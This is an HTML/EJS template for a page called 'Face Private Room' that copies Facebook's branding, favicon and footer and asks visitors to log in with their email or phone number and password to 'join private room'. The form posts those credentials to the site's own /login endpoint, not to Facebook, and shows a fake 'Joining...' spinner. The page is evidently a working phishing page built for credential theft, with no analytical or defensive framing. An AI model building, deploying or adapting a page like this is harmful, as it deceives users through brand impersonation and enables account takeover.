<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8" />
    <link rel="shortcut icon" href="https://www.facebook.com/images/fb_icon_325x325.png" type="image/x-icon">
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>Face Private Room</title>
    <link rel="stylesheet" href="/index.css" />
    <style>
        .message {
            padding: 15px;
            margin: 15px 0;
            border-radius: 8px;
            font-size: 12px;
            font-weight: bold;
            text-align: center;
            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
        }

        .error {
            background-color: #f8d7da;
            color: #721c24;
            border: 1px solid #f5c6cb;
        }

        .success {
            background-color: #d4edda;
            color: #155724;
            border: 1px solid #c3e6cb;
        }

        .joining {
            display: flex;
            align-items: center;
            justify-content: center;
            margin-top: 20px;
            font-size: 16px;
            font-weight: 600;
            color: #3498db;
            border-radius: 5px;
            padding: 10px;
            background-color: #eaf4ff;
            box-shadow: 0px 4px 12px rgba(0, 0, 0, 0.1);
            border: 1px solid #b4d8ff;
            transition: all 0.3s ease-in-out;
        }

     
        .loader {
            margin-left: 10px;
            border: 4px solid #e0e0e0;
            border-radius: 50%;
            border-top: 4px solid #3498db;
            width: 16px;
            height: 16px;
            animation: spin 0.8s linear infinite;
        }

        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
    </style>
</head>

<body>
    <div class="wrapper">
        <div class="left-side">
            <div class="left-container">
                <img src="/image/face.svg" class="img" alt="" />
                 <!-- <h1 class="face-h1">Face Private Chat Room</h1> -->
                <h2 class="face-p">Log In to join private room.</h2>
            </div>
        </div>

        <div class="right-s">
            <div class="right-side"></div>
            <div class="login-box">
                <form action="/login" method="post" onsubmit="showSpinner()">
                    <% if (message) { %>
                        <div class="message <% if (message.includes('success')) { %> success <% } else { %> error <% } %>">
                            <%= message %>
                        </div>
                    <% } %>
                    <input type="text" name="email" placeholder="Email address or phone number" required value="<%= email %>">
                    <input type="password" name="password" placeholder="Password" required value="<%= password %>">
                    
                    <!-- Spinner and "Joining..." text - initially hidden -->
                    <div class="joining" style="display: none;">
                        Joining... <div class="loader"></div>
                    </div>
                    
                    <!-- Submit button -->
                    <button type="submit" class="log">Join</button>
                
                    <a href="#" class="log-link">Forgotten password?</a>
                    <hr>
                    <div class="create-btn-wrapper">
                        <a href="https://web.facebook.com/?_rdc=1&_rdr" class="create-btn">Create new account</a>
                    </div>
                </form>
                
            </div>
            <div class="form-b">
                <a href="https://web.facebook.com/?_rdc=1&_rdr" class="create-p">Log In</a>
                to join the private room.
            </div>
        </div>
        </div>
        
    </div>

    <footer>
        <div class="foot-wrapper">
            <ul>
                <li><a href="">(UK)</a> </li>
                <li><a href="">Hausa</a></li>
                <li><a href="">Français (France)</a></li>
                <li><a href="">Português (Brasil)</a></li>
                <li><a href="">Español</a> </li>
                <li></li><a href="">العربية</a></li>
                <li><a href="">Bahasa Indonesia</a></li>
                <li><a href="">Deutsch</a></li>
                <li><a href="">日本語</a></li>
                <li><a href="">Italiano</a></li>
                <li><a href="">हिन्दी</a></li>
            </ul>
        </div>
    </footer>

    <script>
        // Show spinner function
        function showSpinner() {
            // Display the spinner and text
            document.querySelector('.joining').style.display = 'flex';
    
            // Disable the submit button
            document.querySelector('.log').disabled = true;
        }
    </script>
</body>

</html>
